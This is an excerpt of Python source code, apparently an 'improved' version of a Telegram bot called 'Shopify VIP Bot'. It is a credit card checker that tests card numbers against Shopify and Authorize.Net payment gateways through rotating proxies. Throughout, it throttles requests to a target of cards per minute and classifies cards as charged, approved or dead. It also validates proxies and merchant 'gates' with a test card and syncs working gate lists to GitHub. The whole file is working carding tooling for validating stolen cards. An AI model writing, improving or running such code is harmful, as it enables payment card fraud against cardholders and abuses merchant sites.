...
# Create the improved bot code
improved_code = '''# ==============================================================================
# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘𝗠 (REAL CHECK ENGINE v2.0)
# ==============================================================================
import asyncio
import aiohttp
import aiofiles
...
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()  # Required for updating sites.txt on GitHub
...
GITHUB_API_SITES_URL = os.getenv("GITHUB_API_SITES_URL", "")  # API URL for updating sites.txt
KEYS_FILE = "redeem_keys.json"

# ====================== CPM & SPEED CONTROL ======================
# CPM Target: Cards Per Minute - تحديد سرعة محددة
CPM_TARGET = int(os.getenv("CPM_TARGET", "120"))  # Default 120 CPM = 2 cards/second
MIN_DELAY = float(os.getenv("MIN_DELAY", "0.5"))  # Minimum delay between requests
MAX_DELAY = float(os.getenv("MAX_DELAY", "2.0"))  # Maximum delay

# Workers count based on CPM target
WORKERS = max(1, min(50, CPM_TARGET // 10))  # Dynamic workers based on CPM
API_TIMEOUT = 45  # Reduced timeout for faster failures
HIT_DELAY = 1.0
...
# منع إعادة استخدام الأوامر
_CHECKED_USERS_PXY = set()   # Users who used /checkpxy
_CHECKED_USERS_GATES = set() # Users who used /checkgates
_CHECK_PXY_COOLDOWN = 3600   # 1 hour cooldown
_CHECK_GATES_COOLDOWN = 1800 # 30 min cooldown
_CHECK_PXY_TIME = {}         # Last check time
_CHECK_GATES_TIME = {}       # Last check time
...
# بطاقة تجريبية لفحص البوابات والبروكسيات (Luhn valid test card)
...
'''
Part2 = '''
# ====================== REAL SHOPIFY GATEWAY ENGINE v2.0 ======================
# فحص حقيقي بدون وهم - يتحقق فعلياً من الـ API ويرسل الطلبات بشكل صحيح

async def check_shopify_api(api_url, card, site, proxy, session):
    """
    محرك فحص Shopify حقيقي:
    - يرسل الطلب بشكل صحيح مع encoding
    - يحلل الرد بشكل دقيق
    - لا يسقط النتائج الحقيقية كـ "Site Error"
    - يُرجع الحالة الحقيقية فقط
    """
    try:
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
        
        # تنظيف وتجهيز البطاقة
        card = str(card).strip()
        ...
        async with session.get(req_url, headers=headers, timeout=API_TIMEOUT, ssl=False) as resp:
            ...
            try:
                ...
                # استخراج الرسالة من أي مفتاح ممكن
            ...
            if any(k in clean_rm for k in charged_keywords):
                # تحقق إضافي: إذا كان الرد يحتوي على "not" أو "declined" مع charged، فهو dead
            ...
            # 🟡 APPROVED - موافقة بدون شحن (CVV match)
            approved_keywords = [
            ...
            # ⚠️ SITE ERROR - أخطاء حقيقية في الموقع/البوابة
            site_error_keywords = [
            ...
            # إذا وصلنا هنا، الرد غير معروف - نُرجعه كـ Dead (أو Site Error إذا كان غامض)
            # هذا يمنع الفحص الوهمي - إما نعرف النتيجة أو نُرجع Dead
...
# ====================== REAL AUTHNET GATEWAY ENGINE v2.0 ======================
async def check_authnet_api(card, proxy, session):
    """
    محرك فحص AuthNet حقيقي مع تحليل دقيق للردود
    """
    try:
        ...
        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT, ssl=False) as resp:
            ...
            return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00'}
...
# ====================== REAL PROXY CHECKER ENGINE ======================
async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=15):
    """
    فحص حقيقي للبروكسي: يرسل بطاقة تجريبية للـ API ويتحقق من الرد
    يُرجع: (is_working: bool, error_message: str)
    """
    ...
    # اختبار 2: فحص حقيقي عبر الـ Gateway ببطاقة تجريبية
    try:
        card_encoded = quote(test_card)
        site = "touch-of-finland.myshopify.com"
        req_url = f"{SHOPIFY_API_URL_1}?site=https://{site}&cc={card_encoded}&proxy={quote(proxy_url)}"
        
        async with session.get(req_url, headers=test_headers, proxy=proxy_url, timeout=timeout, ssl=False) as r:
            text = await r.text()
            
            # إذا رجع رد بنكي أي كان = البروكسي يعمل
            if r.status == 200 and text.strip():
                # تحقق أن الرد ليس HTML error page
                if "<html" not in text.lower():
                    return True, "Gateway Test Passed"
            
            # حتى لو رجع 404 أو 403 من الـ API، هذا يعني البروكسي يوصل
...
# ====================== REAL GATE CHECKER ENGINE ======================
async def check_gate_real(site, proxy_url, session, test_card=TEST_CARD, timeout=20):
    """
    فحص حقيقي للبوابة: يرسل بطاقة تجريبية ويتحقق من الرد
    يُرجع: (is_working: bool, status_code: int, response_preview: str)
    """
    try:
        card_encoded = quote(test_card)
        ...
        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=timeout, ssl=False) as r:
            ...
            # إذا رجع رد JSON أو نص بنكي = البوابة شغالة
            if r.status in [200, 400, 401, 403, 404, 422]:
                # تحقق أن الرد يحتوي على كلمات بنكية
                ...
                # إذا كان الرد قصير وغامض، نعتبره شغال
...
class CPMController:
    """
    متحكم في سرعة الفحص (Cards Per Minute)
    يضبط التأخير بين الطلبات ديناميكياً للوصول للـ CPM المستهدف
    """
    def __init__(self, target_cpm):
        self.target_cpm = target_cpm
        self.target_cps = target_cpm / 60.0  # Cards per second
    ...
    async def wait(self):
        async with self.lock:
            ...
            if current_cpm >= self.target_cpm:
                # نحن أسرع من المطلوب - أبطئ
                delay = self.max_delay
            else:
                # نحن أبطأ من المطلوب - سرعة معقولة
...
# إنشاء متحكم CPM عام
_cpm_controller = CPMController(CPM_TARGET)


# ====================== REAL CHECK CARD ENGINE (NO FAKE CHECKS) ======================
async def check_card_real(card, sites, proxies, session, gateway_name, uid):
    """
    محرك فحص حقيقي:
    - يضرب الـ API مرة واحدة فقط (لا retries وهمية)
    - إذا فشل = Dead (وليس Skipped)
    - لا يُخفي النتائج
    """
    # اختيار بروكسي وموقع عشوائي
    ...
    try:
        ...
        # Site Error = نحاول مرة أخرى ببروكسي/موقع مختلف (محاولة واحدة فقط)
        ...
        # إذا ما زال Site Error بعد المحاولة الثانية = Dead (لا Skipped)
        if status == 'Site Error':
...
async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        kb = [
            ...
            [InlineKeyboardButton('AuthNet ($5.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
...
async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        # ====================== REAL /checkpxy COMMAND ======================
            ...
            if uid in _CHECKED_USERS_PXY:
                ...
                if remaining > 0:
                    ...
                    return await styled_reply(update, 
                        ...
                        f"├ {sf('You have already used /checkpxy recently.')}\\n"
            ...
            dead_proxies = []  # قائمة البروكسيات الميتة
            working_count = 0
            ...
            async with aiohttp.ClientSession(connector=connector) as test_session:
                ...
                # فحص متوازي بحد أقصى 10 في نفس الوقت
            ...
            # حذف البروكسيات الميتة (من الأخير للأول لتجنب مشاكل الفهارس)
            deleted_count = 0
...
<i>{sf('You cannot use /checkpxy again for 1 hour.')}</i>"""
        ...
        # ====================== REAL /checkgates COMMAND ======================
            ...
            tm = await styled_reply(update, 
                f"<b>{CE_GEAR} {sf('Starting REAL gate check...')}</b>\\n"
                f"╰ <b>{CE_HOURGLASS} {sf('Testing each gate with a test card...')}</b>", 
                use_gif=True)
            ...
            try:
                ...
                if update.message.reply_to_message and update.message.reply_to_message.document:
                    ...
                    # جلب من GitHub
                    async with aiohttp.ClientSession() as s:
                        async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=15) as r:
                            if r.status == 200:
                                content = await r.text()
                                raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\\n') if l.strip()]))
                            else:
                                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch sites from GitHub.')}</b>")
                ...
                valid_sites = list(dict.fromkeys(valid_sites))  # Remove duplicates while preserving order
                
                if not valid_sites:
                    return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('No valid sites found to test.')}</b>")
                
                await styled_edit(tm, 
                    f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(valid_sites)}</code> {sf('gates with real cards...')}</b>")
                ...
                async with aiohttp.ClientSession(connector=connector) as test_session:
                    ...
                    semaphore = asyncio.Semaphore(5)  # 5 concurrent tests max
                ...
                # حفظ المواقع الشغالة في sites.txt المحلي
                if working_sites:
                ...
                # محاولة تحديث GitHub (إذا توفر token)
                github_updated = False
                if GITHUB_TOKEN and GITHUB_API_SITES_URL:
                    try:
                        headers = {
                        ...
                        async with aiohttp.ClientSession() as s:
                            async with s.get(GITHUB_API_SITES_URL, headers=headers) as r:
                                if r.status == 200:
                                    data = await r.json()
                                    sha = data.get('sha')
                                    ...
                                    # Update file
                                    payload = {
                                        "message": f"Update sites.txt - {len(working_sites)} working gates",
                                        "content": content_b64,
                                        "sha": sha
                                    }
                                    async with s.put(GITHUB_API_SITES_URL, headers=headers, json=payload) as r2:
                ...
                # النتيجة النهائية
                github_status = f"\\n├ <b>{CE_CHECK} {sf('GitHub Updated')}:</b> <code>{sf('Yes') if github_updated else sf('No Token')}</code>" if GITHUB_TOKEN else ""
                
                res_msg = f"""<b>{CE_CROWN} {sf('REAL Gates Check Complete')} {CE_PARTY}</b>

├ <b>{sf('Total Checked')}:</b> <code>{sf(str(len(valid_sites)))}</code>
├ <b>{CE_CHECK} {sf('Working Gates')}:</b> <code>{sf(str(len(working_sites)))}</code>
├ <b>{CE_SHIELD} {sf('Cloudflare Blocked')}:</b> <code>{sf(str(len(cf_sites)))}</code>
├ <b>{CE_CLOWN} {sf('Dead Removed')}:</b> <code>{sf(str(len(dead_sites)))}</code>{github_status}
╰ <b>{CE_GEAR} {sf('Saved to sites.txt')}:</b> <code>{sf(str(len(working_sites)))}</code>

<i>{sf('Dead gates removed from local sites.txt')}</i>
...
async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    ...
    # إنشاء متحكم CPM خاص بهذه العملية
...
def main():
    ...
    logger.info("✅ VIP BOT v2.0 IS FULLY OPERATIONAL WITH REAL CHECK ENGINE!")
    while True:
        try:
